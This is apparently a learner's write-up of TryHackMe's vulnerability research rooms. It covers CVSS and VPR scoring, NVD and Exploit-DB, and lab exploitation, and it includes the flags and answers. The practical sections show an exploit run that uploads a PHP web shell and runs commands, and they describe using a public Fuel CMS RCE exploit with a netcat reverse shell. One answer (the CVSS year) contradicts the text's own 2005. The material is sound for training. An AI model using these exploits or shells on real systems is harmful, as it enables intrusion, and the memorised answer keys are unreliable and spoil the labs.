Vulnerability Research -> Main File Name


# Vulnerabilities 101

Familiarise yourself with the skills, research methods, and resources used to exploit vulnerable applications and systems.

[Vulnerabilities 101](https://tryhackme.com/room/vulnerabilities101)

[Exploit Vulnerabilities](https://tryhackme.com/room/exploitingavulnerabilityv2)

[Vulnerability Capstone](https://tryhackme.com/room/vulnerabilitycapstone)


## Topic's

- Common Vulnerabity Scoring System
- Vulnerability Database
- Exploiting Vulnerability


# Task 1 Introduction 
Cybersecurity is big business in the modern-day world. The hacks that we hear about in newspapers are from exploiting vulnerabilities. In this room, we're going to explain exactly what a vulnerability is, the types of vulnerabilities and how we can exploit these for success in our penetration testing endeavours.
An enormous part of penetration testing is knowing the skills and resources for whatever situation you face. This room is going to introduce you to some resources that are essential when researching vulnerabilities, specifically, you are going to be introduced to:
* What vulnerabilities are
* Why they're worthy of learning about
* How are vulnerabilities rated
* Databases for vulnerability research
* A showcase of how vulnerability research is used on ACKme's engagement

## Answer the questions below
Read this task! `No anwser needed`

# Task 2 Introduction to Vulnerabilities
A vulnerability in cybersecurity is defined as a weakness or flaw in the design, implementation or behaviours of a system or application. An attacker can exploit these weaknesses to gain access to unauthorised information or perform unauthorised actions. The term “vulnerability” has many definitions by cybersecurity bodies. However, there is minimal variation between them all.
For example, NIST defines a vulnerability as “weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source”.
Vulnerabilities can originate from many factors, including a poor design of an application or an oversight of the intended actions from a user.
We will come on to discuss the various types of vulnerabilities in a later room. However, for now, we should know that there are arguably five main categories of vulnerabilities:

Vulnerability	Description
Operating System	These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based	These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials	Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker.
Application Logic	These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor	Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.
As a cybersecurity researcher, you will be assessing applications and systems - using vulnerabilities against these targets in day-to-day life, so it is crucial to become familiar with this discovery and exploitation process.
## Answer the questions below
An attacker has been able to upgrade the permissions of their system account from "user" to "administrator". What type of vulnerability is this?  `Operating System`
You manage to bypass a login panel using cookies to authenticate. What type of vulnerability is this? `Application Logic`

# Task 3 Scoring Vulnerabilities (CVSS & VPR)
Vulnerability management is the process of evaluating, categorising and ultimately remediating threats (vulnerabilities) faced by an organisation.
It is arguably impossible to patch and remedy every single vulnerability in a network or computer system and sometimes a waste of resources.
After all, only approximately 2% of vulnerabilities only ever end up being exploited (Kenna security., 2020). Instead, it is all about addressing the most dangerous vulnerabilities and reducing the likelihood of an attack vector being used to exploit a system.

This is where vulnerability scoring comes into play. Vulnerability scoring serves a vital role in vulnerability management and is used to determine the potential risk and impact a vulnerability may have on a network or computer system. For example, the popular Common Vulnerability Scoring System (CVSS) awards points to a vulnerability based upon its features, availability, and reproducibility.

Of course, as always in the world of IT, there is never just one framework or proposed idea. Let’s explore two of the more common frameworks and analyse how they differ.
## Common Vulnerability Scoring System
First introduced in 2005, the Common Vulnerability Scoring System (or CVSS) is a very popular framework for vulnerability scoring and has three major iterations. As it stands, the current version is CVSSv3.1 (with version 4.0 currently in draft) a score is essentially determined by some of the following factors (but many more):
  1. How easy is it to exploit the vulnerability?
  2. Do exploits exist for this?
  3. How does this vulnerability interfere with the CIA triad?

In fact, there are so many variables that you have to use a calculator to figure out the score using this framework. A vulnerability is given a classification (out of five) depending on the score that is has been assigned. I have put the Qualitative Severity Rating Scale and their score ranges into the table below. 

Rating	Score
None	0
Low	0.1 - 3.9
Medium	4.0 - 6.9
High	7.0 - 8.9
Critical	9.0 - 10.0
However, CVSS is not a magic bullet. Let's analyse some of the advantages and disadvantages of CVSS in the table below:
Advantages of CVSS	Disadvantages of CVSS
CVSS has been around for a long time.	CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity.
CVSS is popular in organisations.	CVSS heavily assesses vulnerabilities on an exploit being available. However, only 20% of all vulnerabilities have an exploit available (Tenable., 2020) .
CVSS is a free framework to adopt and recommended by organisations such as NIST.	Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found.

##  Vulnerability Priority Rating (VPR)
The VPR framework is a much more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS).
Unlike CVSS, VPR scoring takes into account the relevancy of a vulnerability. For example, no risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation (i.e. they do not use the software that is vulnerable). VPR is also considerably dynamic in its scoring, where the risk that a vulnerability may pose can change almost daily as it ages.
VPR uses a similar scoring range as CVSS, which I have also put into the table below. However, two notable differences are that VPR does not have a "None/Informational" category, and because VPR uses a different scoring method, the same vulnerability will have a different score using VPR than when using CVSS.
Rating	Score
Low	0.0 - 3.9
Medium	4.0 - 6.9
High	7.0 - 8.9
Critical	9.0 - 10.0

Let's recap some of the advantages and disadvantages of using the VPR framework in the table below.
Advantages of VPR	Disadvantages of VPR
VPR is a modern framework that is real-world.	VPR is not open-source like some other vulnerability management frameworks.
VPR considers over 150 factors when calculating risk.	VPR can only be adopted apart of a commercial platform.
VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities.	VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR.
Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages.	Intentionally left blank.
## Answer the questions below
What year was the first iteration of CVSS published? `2015 `

If you wanted to assess vulnerability based on the risk it poses to an organisation, what framework would you use?
Note: We are looking for the acronym here. `VPR`

If you wanted to use a framework that was free and open-source, what framework would that be?
Note: We are looking for the acronym here. `CVSS`

# Task 4 Vulnerability Databases
Throughout your journey in cybersecurity, you will often come across a magnitude of different applications and services. For example, a CMS whilst they all have the same purpose, often have very different designs and behaviours (and, in turn, potentially different vulnerabilities).
Thankfully for us, there are resources on the internet that keep track of vulnerabilities for all sorts of software, operating systems and more! This room will showcase two databases that we can use to look up existing vulnerabilities for applications discovered in our infosec journey, specifically the following websites:
1. NVD (National Vulnerability Database)
2. Exploit-DB
Before we dive into these two resources, let's ensure that our understanding of some fundamental key terms is on the same page:
Term	Definition
Vulnerability	A vulnerability is defined as a weakness or flaw in the design, implementation or behaviours of a system or application.
Exploit	An exploit is something such as an action or behaviour that utilises a vulnerability on a system or application.
Proof of Concept (PoC)	A PoC is a technique or tool that often demonstrates the exploitation of a vulnerability.
## NVD – National Vulnerability Database
The National Vulnerability Database is a website that lists all publically categorised vulnerabilities. In cybersecurity, vulnerabilities are classified under “Common Vulnerabilities and Exposures” (Or CVE for short).
These CVEs have the formatting of CVE-YEAR-IDNUMBER. For example, the vulnerability that the famous malware WannaCry used was CVE-2017-0144.
NVD allows you to see all the CVEs that have been confirmed, using filters by category and month of submission. For example, it is three days into August; there have already been 223 new CVEs submitted to this database.
￼
While this website helps keep track of new vulnerabilities, it is not great when searching for vulnerabilities for a specific application or scenario.
##  Exploit-DB
Exploit-DB is a resource that we, as hackers, will find much more helpful during an assessment. Exploit-DB retains exploits for software and applications stored under the name, author and version of the software or application.
We can use Exploit-DB to look for snippets of code (known as Proof of Concepts) that are used to exploit a specific vulnerability.
￼

## Answer the questions below
Using NVD, how many CVEs were published in July 2021? 
￼
`1554 `

Who is the author of Exploit-DB?  `OffSec`


# Task 5 An Example of Finding a Vulnerability
In this task, I’m going to demonstrate the process of finding one minor vulnerability, coupled with some research of the vulnerability databases leading to a much more valuable vulnerability and exploit ultimately.

Throughout an assessment, you will often combine multiple vulnerabilities to get results. For example, in this task, we will leverage the “Version Disclosure” vulnerability to find out the version of an application. With this version, we can then use Exploit-DB to search for any exploits that work with that specific version. 

Applications and software usually have a version number. This information is usually left with good intentions; for example, the author can support multiple versions of the software and the likes. Or sometimes, left unintentionally.

For example, in the screenshot below, we can see that the name and version number of this application is “Apache Tomcat 9.0.17”

￼

With this information in hand, let’s use the search filter on Exploit-DB to look for any exploits that may apply to “Apache Tomcat 9.0.17”.

￼

Great! After searching Exploit-DB, there are a total of five exploits that may be useful to us for this specific version of the application. 
## Answer the questions below
What type of vulnerability did we use to find the name and version of the application in this example? `Version Disclosure`

# Task 6 Showcase: Exploiting Ackme’s Application 
It is your first week on the job as Jr. Penetration tester at ThePentestingCo. For your first engagement, you are shadowing a Sr. Penetration  Tester within the company. Deploy the site attached to this task and follow the steps that the Sr. Penetration Tester took to exploit a vulnerability against ACKme IT Service's infrastructure.

## Answer the questions below
Follow along with the showcase of exploiting ACKme's application to the end to retrieve a flag. What is this flag?
```
user@thepentestingco:~$ run exploit -u http://240.228.189.136
Running exploit!
Exploit complete! Launching shell...
administrator@ackmeitservices:~$ whoami
ACKME\Administrator
```
`THM{ACKME_ENGAGEMENT} `

# Task 7 Conclusion
Nice work! We’ve made it to the end. This room has served as an introductory to vulnerability research and some skills and resources this requires, where you have practically applied this knowledge.
## Answer the questions below
Continue on your learning with the additional rooms in this module. `No answer needed`


# Exploit Vulnerabilities

[Exploit Vulnerabilities](https://tryhackme.com/room/exploitingavulnerabilityv2)

## Topic's

- Automated Vs. Manual Vulnerability Research
- Manual Exploitations

# Task 1 Introduction 
In this room, we are going to be going over some means of identifying vulnerabilities and coupling our research skills to learn how these can be abused.
Additionally, you will find some publicly available resources that are essential additions to your skill set and tools when performing vulnerability research and exploitation. You will then get to apply all of this into a practical challenge at the end of the room.
## Answer the questions below
Let's proceed. `No answer needed`

# Task 2 Automated Vs. Manual Vulnerability Research
There is a myriad of tools and services available in cybersecurity for vulnerability scanning. Ranging from being commercial (and footing a heavy bill) to open-source and free, vulnerability scanners are convenient means of quickly canvassing an application for flaws.

￼

For example, the vulnerability scanner Nessus has both a free (community) edition and commercial. The commercial version costing thousands of pounds for a year's license will likely be used in organisations providing penetration testing services or audits. If you’d like to know more about Nessus, check out the TryHackMe room dedicated to it.

I have detailed some of the advantages and disadvantages of using a vulnerability scanner in the table below:

Advantage	Disadvantage
Automated scans are easy to repeat, and the results can be shared within a team with ease.	People can often become reliant on these tools.
These scanners are quick and can test numerous applications efficiently.	They are extremely "loud" and produce a lot of traffic and logging. This is not good if you are trying to bypass firewalls and the likes.
Open-source solutions exist.	Open-source solutions are often basic and require expensive licenses to have useful features.
Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for.	They often do not find every vulnerability on an application.
Frameworks such as Metasploit often have vulnerability scanners for some modules; this is something you will come onto learn about in a further module in this pathway.

Manual scanning for vulnerabilities is often the weapon of choice by a penetration tester when testing individual applications or programs. In fact, manual scanning will involve searching for the same vulnerabilities and uses similar techniques as automated scanning.

Ultimately, both techniques involve testing an application or program for vulnerabilities. These vulnerabilities include:

Vulnerability	Description
Security Misconfigurations	Security misconfigurations involve vulnerabilities that are due to developer oversight. For example, exposing server information in messages between the application and an attacker.
Broken Access Control	This vulnerability occurs when an attacker is able to access parts of an application that they are not supposed to be able to otherwise.
Insecure Deserialization	This is the insecure processing of data that is sent across an application. An attacker may be able to pass malicious code to the application, where it will then be executed.
Injection	An Injection vulnerability exists when an attacker is able to input malicious data into an application. This is due to the failure of not ensuring (known as sanitising) input is not harmful.
If you are keen to learn more about these vulnerabilities, the OWASP framework will be a useful read to you. TryHackMe even has a room showcasing the top ten vulnerabilities outlined by OWASP.

## Answer the questions below
You are working close to a deadline for your penetration test and need to scan a web application quickly. Would you use an automated scanner? (Yay/Nay)  `Yay`
You are testing a web application and find that you are able to input and retrieve data in a database.  What vulnerability is this? `Injection`
You manage to impersonate another user. What vulnerability is this? `Broken Access Control`


# Task 3 Finding Manual Exploits
## Rapid7
Much like other services such as Exploit DB and NVD, Rapid7 is a vulnerability research database. The only difference being that this database also acts as an exploit database. Using this service, you can filter by type of vulnerability (I.e. application and operating system).

￼



Additionally, the database contains instructions for exploiting applications using the popular Metasploit tool (you will learn about this tool in-depth later in the learning path). For example, this entry on Rapid7 is for “Wordpress Plugin SP Project & Document”, where we can see instructions on how to use an exploit module to abuse this vulnerability.

￼
## GitHub
GitHub is a popular web service designed for software developers. The site is used to host and share the source code of applications to allow a collaborative effort. However, security researchers have taken to this platform because of the aforementioned reasons as well. Security researchers store & share PoC’s (Proof of Concept) on GitHub, turning it into an exploit database in this context.

GitHub is extremely useful in finding rare or fresh exploits because anyone can create an account and upload – there is no formal verification process like there is with alternative exploit databases. With that said, there is also a downside in that PoC’s may not work where little to no support will be provided.


￼

GitHub uses a tagging and keyword system, meaning that we can search GitHub by keywords such as “PoC”, “vulnerability”, and many more. At the time of writing, there are 9,682 repositories with the keyword “cve”. We are also able to filter the results by programming language.

## Searchsploit
Searchsploit is a tool that is available on popular pentesting distributions such as Kali Linux. It is also available on the TryHackMe AttackBox. This tool is an offline copy of Exploit-DB, containing copies of exploits on your system. 

You are able to search searchsploit by application name and/or vulnerability type. For example, in the snippet below, we are searching searchsploit for exploits relating to Wordpress that we can use – no downloading necessary!
```
Using Searchsploit to look for exploits relating to "Wordpress"
searchsploit wordpress
WordPress Theme Think Responsive 1.0 - Arbitr | php/webapps/29332.txt
WordPress Theme This Way - 'upload_settings_i | php/webapps/38820.php
WordPress Theme Toolbox - 'mls' SQL Injection | php/webapps/38077.txt
WordPress Theme Trending 0.1 - 'cpage' Cross- | php/webapps/36195.txt
WordPress Theme Uncode 1.3.1 - Arbitrary File | php/webapps/39895.php
WordPress Theme Urban City - 'download.php' A | php/webapps/39296.txt
WordPress Theme Web Minimalist 1.1 - 'index.p | php/webapps/36184.txt
WordPress Theme White-Label Framework 2.0.6 - | php/webapps/38105.txt
WordPress Theme Wp-ImageZoom - 'id' SQL Injec | php/webapps/38063.txt
WordPress Theme Zoner Real Estate - 4.1.1 Per | php/webapps/47436.txt
```
## Answer the questions below
What website would you use as a security researcher if you wanted to upload a Proof of Concept? `Github`
You are performing a penetration test at a site with no internet connection. What tool could you use to find exploits to use? `Searchsploit `

# Task 4 Example of Manual Exploitation
We can use the information gathered from task 2 in this room to exploit the vulnerable service. Ultimately, one of the most effective vulnerabilities that we can exploit is the ability to execute commands on the target that is running the vulnerable application or service.
For example, being able to execute commands on the target that is running the vulnerable application or service will allow us to read files or execute commands that we previously wouldn’t be able to perform using the application or service alone. Additionally, we can abuse this to gain what is known as a foothold to the machine. A foothold is an access to the vulnerable machine’s console, where we can then begin to exploit other applications or machines on the network.
￼
We are going to use an exploit to perform remote code execution on the application from task 2 to be able to remotely execute commands on the vulnerable machine.
Before we start, it is important to note that exploits rarely come out of the box and are ready to be used. They often require some configuration before they will work for our environment or target. The level of configuration will vary upon the exploit, so you will often find multiple exploits for the same vulnerability on an application. It is up to you to figure out which exploit is the most appropriate or useful to you.
For example, in the snippet below, we can see that a few options have been changed to reflect the IP address of the machine that we are attacking from.
```
Modifying an Exploit (Before)
nano exploit.py
mymachine="192.168.1.10"
port="1337"
```
```
Modifying an Exploit (After)
nano exploit.py
mymachine="10.13.37.10"
port="1337"
```
Once we have configured the exploit correctly, let’s further read this exploit to understand how to use it. In the snippet below, we can see that we need to provide two arguments when running the exploit:
```
Listing the arguments for an exploit
exploit.py --help
To use this exploit, provide the following arguments:
-u The URL of the application
-c the command that you wish to execute
```
With this information in mind, we are now ready to use this exploit on the vulnerable machine. We are going to do the following:
1. Use the exploit to upload a malicious file to the vulnerable application containing whatever command we wish to execute, where the web server will run this malicious file to execute the code.
2. The file will first contain a basic command that we will use to verify that the exploit has worked.
3. Then we are going to read the contents of a file located on the vulnerable machine.
```
Running the exploit to output the name of the user that the application is running as
exploit.py -u http://10.10.10.10 -c "whoami"
www-data
```
```
Running the exploit to output the contents of a file on the target machine
exploit.py -u http://10.10.10.10 -c "cat flag.txt"
THM{EXPLOIT_COMPLETE}
```
## Answer the questions below
What type of vulnerability was used in this attack? `remote code execution`


# Task 5 Practical: Manual Exploitation
Note: You will need to either deploy the AttackBox or connect to the TryHackMe network to complete this task.
Deploy the machine attached to this task and wait a minimum of five minutes for it to be fully set up. After five minutes, visit the webserver running on the machine by navigating to http://MACHINE_IP in the browser of the device connected to the THM network (your own or the AttackBox). 

## Answer the questions below
Find out the version of the application that is running. What are the name and version number of the application? Find answer carefully in the source code.  `Online Book Store v1.0`
Now use the resources and skills from this module to find an exploit that will allow you to gain remote access to the vulnerable machine. `No answer needed`
Use this exploit against the vulnerable machine. What is the value of the flag located in a web directory?

1- First search on Exploit-DB about Online Book Store Vulnerability, then download the .py file from Online Book Store 1.0 - Unauthenticated Remote Code Execution, change the .py file name to exploit.py

2- Run below scripts
```
root@ip-10-10-7-48:~# python exploit.py http://10.10.59.185
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.59.185/bootstrap/img/zUlCikEeBa.php
> Example command usage: http://10.10.59.185/bootstrap/img/zUlCikEeBa.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ exploit.py -u http://10.10.59.185 -c "whoami"

RCE $ exploit.py -u http://10.10.59.185 -c "cat flag.txt"

RCE $ ls /
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

RCE $ cd /var/www/html/bootstrap

RCE $ ls
OyWjgNLIbq.php
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
flag.txt
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
pro_asp4.jpg
pro_js.jpg
unnamed.png
web_app_dev.jpg
zUlCikEeBa.php

RCE $ cat flag.txt
THM{BOOK_KEEPING}
```
`THM{BOOK_KEEPING}`


# Vulnerability Capstone 

[Vulnerability Capstone](https://tryhackme.com/room/vulnerabilitycapstone)

# Task 1 Introduction 
Summarise the skills learnt in this module by completing this capstone room for the "Vulnerability Research" module. Ackme Support Incorporated has recently set up a new blog. Their developer team have asked for a security audit to be performed before they create and publish articles to the public. It is your task to perform a security audit on the blog; looking for and abusing any vulnerabilities that you find.

# Task 2 Exploit the Machine (Flag Submission)
Deploy the vulnerable machine attached to this by pressing the green "Start Machine" button. It is recommended that you use the TryHackMe AttackBox to complete this room. Allow five minutes to pass before attempting to attack the vulnerable machine MACHINE_IP. 

## Answer the questions below
Deploy the vulnerable machine attached to this task & wait five minutes before visiting the vulnerable machine. `No answer needed`

What is the name of the application running on the vulnerable machine? `Fuel CMS`

What is the version number of this application? `1.4`

What is the number of the CVE that allows an attacker to remotely execute code on this application? `CVE-2018-16763`
Format: CVE-XXXX-XXXXX 

Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.

Note: There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)
What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.

1-For personal reference, I practiced a further Nmap scan to gain an idea of the target’s open ports that we can tap into.
￼
2-After attempting the scripts in “Exploit-DB,” I discovered that some of them appear to have an error, so I decided to search for others using Google and found one at “Github” that works. 
```https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py```

All we have to do is copy the source code, paste it into our machine, and save it as a python file.
￼
3- Run the exploit and remember to enter the victim’s IP address before typing “shell_me” to acquire a reverse shell.
* Victim’s IP
* tun0’s IP with reverse shell port

￼
4- Remember to enable “netcat” to listen for incoming reverse shells before launching the attack.

5- Launched the attack and received the reverse shell
￼
6- According to the question, the flag is located at “/home/ubuntu,” and we can proceed directly to the directory.
* Flag Found!
`THM{ACKME_BLOG_HACKED}`



